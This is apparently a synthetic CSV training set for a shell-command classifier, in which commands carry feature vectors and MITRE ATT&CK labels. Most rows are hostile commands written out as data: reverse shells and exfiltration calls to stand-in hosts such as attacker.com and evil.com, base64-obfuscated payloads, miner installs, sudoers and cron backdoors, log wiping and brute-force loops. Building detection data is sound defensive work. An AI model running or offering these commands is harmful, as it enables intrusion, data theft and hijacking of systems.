command,features,label,source
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
find / -writable -type d 2>/dev/null ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
nohup wget -q -O- --header='X-Auth: token123' http://evil.com/cmd && history -c &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
time netstat -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'dGZ0cCAtaSAxMC4wLjAuOTkgR0VUIHBheWxvYWQuZXhlIEM6XFdpbmRvd3NcVGVtcFxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo  'bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
echo  'compromised  ALL=(ALL)  NOPASSWD:ALL'  >>  /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
"bash -c ""echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGwgJiYgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
time ./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo echo 'bG4gLXMgL3RtcC9iYWNrZG9vci5zaCAvZXRjL2Nyb24uZC9zeXN0ZW0tdXBkYXRlICYmID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe && sleep 1,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3c=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'KGNyb250YWIgLWw7IGVjaG8gJyogKiAqICogKiAvdG1wL3BheWxvYWQuc2gnKSB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIC1vIC90bXAvc2hlbGwuc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded &,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""echo 'bm1jbGkgY29ubmVjdGlvbiBzaG93' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -m -s /bin/bash -G sudo newadmin ; > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1053_Scheduled_Task'],synthetic
shred -u /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
nohup gcc exploit.c -o exploit && ./exploit &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
time whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
ssh -L 8080:internal:80 user@jump.host ; history -c,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo dmesg | head -20,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1082_System_Information_Discovery'],synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')) && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nohup cat /etc/passwd | grep -v nologin &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
smbclient  //10.0.0.5/C$  -U  Administrator  ;  chmod  +x  /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIC1vIC90bXAvc2hlbGwuc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
time find / -name '*.pem' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe | > /dev/null 2>&1,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0.2, 0.4, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc  -zv  10.0.0.1  1-1000  2>&1  |  grep  succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
time echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1496_Resource_Hijacking'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/ && > /dev/null 2>&1,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'dXNlcm1vZCAtYUcgc3VkbyBjb21wcm9taXNlZF91c2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo > ~/.bash_history && history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
"bash -c ""echo 'ZWNobyAnJyA+IC92YXIvbG9nL3N5c2xvZyB8IGhpc3RvcnkgLWM=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJiAmJiBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'ZG1lc2cgfCBoZWFkIC0yMA=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
./dirtycow  /etc/passwd  'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'bm1hcCAtc24gMTkyLjE2OC4xLjAvMjQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'bHNjcHU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""echo 'd21pZXhlYy5weSBkb21haW4vYWRtaW46cGFzc0AxMC4wLjAuNSAmJiA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nohup adduser --shell /bin/bash --disabled-password backdoor &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo ln -s /tmp/backdoor.sh /etc/cron.d/system-update | sleep 1,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""cat /etc/group""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
ifconfig -a && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id  -u  |  history  -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
./pwnkit | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyAtYyAiZXhlYyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5eicpLmRlY29kZSgpKSI=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
scp  attacker@10.0.0.99:/tools/linpeas.sh  /tmp/  ;  sleep  1,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"nohup ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)' &","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1087_Account_Discovery'],synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
"ldapsearch  -x  -b  'dc=domain,dc=com'  '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
nohup ssh admin@localhost &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""perl -e 'use Socket; ...'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUn' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time groups && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3Jz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""wmiexec.py domain/admin:pass@10.0.0.5""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
whoami /all ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""crontab -e ; echo done""","[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'c3UgLSBhZG1pbiA7IGVjaG8gZG9uZQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
